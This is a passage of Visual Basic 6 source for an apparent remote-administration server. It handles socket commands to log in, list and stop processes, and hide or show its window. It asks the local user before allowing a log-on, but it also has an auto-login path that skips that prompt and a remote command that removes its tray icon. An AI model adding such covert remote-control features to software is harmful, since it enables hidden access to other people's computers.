    lblStatus.Caption = " Status:  Ending Process - " & PR
    lblStatus.ForeColor = vbGreen
    MessageTimer.Enabled = True
    StopProcess PR
    Exit Sub
End If
If InStr(1, Data, "|LOGIN|") <> 0 Then
    If frmOptions.chkVerify.Value = 1 Then
        Verify Mid(Data, 8, Len(Data))
    Else
        LoginZ Mid(Data, 8, Len(Data))
        lblStatus.Caption = " Status:  Logging In User"
        lblStatus.ForeColor = vbGreen
        MessageTimer.Enabled = True
    End If
    Exit Sub
End If
If InStr(1, Data, "|REFRESH PROCESSES|") <> 0 Then
    RefreshProcesses
    Exit Sub
End If
If InStr(1, Data, "|HIDE|") <> 0 Then
    Me.Hide
    Hidden = True
    RemoveIconFromTray
    Exit Sub
End If
If InStr(1, Data, "|SHOW|") <> 0 Then
    Me.Show
    Hidden = False
    AddIcon2Tray
    Exit Sub
End If
End Sub
Private Sub Verify(Whoz As String)
Dim OK As Boolean
For i = 0 To frmOptions.List1.ListCount - 1
    If frmOptions.List1.List(i) = Whoz Then
        If frmOptions.chkAutoLogin.Value = 1 Then
            SendTheInformation
            Exit Sub
        Else
            LoginZ Whoz
            Exit Sub
        End If
    End If
Next i
lblStatus.Caption = " Status:  Listening"
W1.Close
W1.Listen
SockExplorer.Close
SockExplorer.Listen
End Sub
Private Sub LoginZ(Who As String)
If MsgBox(Who & " Is attempting to log onto your computer.  Do you want to allow this?", vbYesNo, "ATTEMPTED LOG ON BY " & Who) = vbNo Then
    W1.Close
    W1.Listen
    SockExplorer.Close
    SockExplorer.Listen
    lblStatus.Caption = " Status:  Listening"
    Exit Sub
Else
    lblStatus.Caption = " Status:  " & Who & " - Currently Connected"
    SendTheInformation
End If
End Sub
Private Sub StopProcess(process As String)
Text1.Text = process
Command1 = True
End Sub
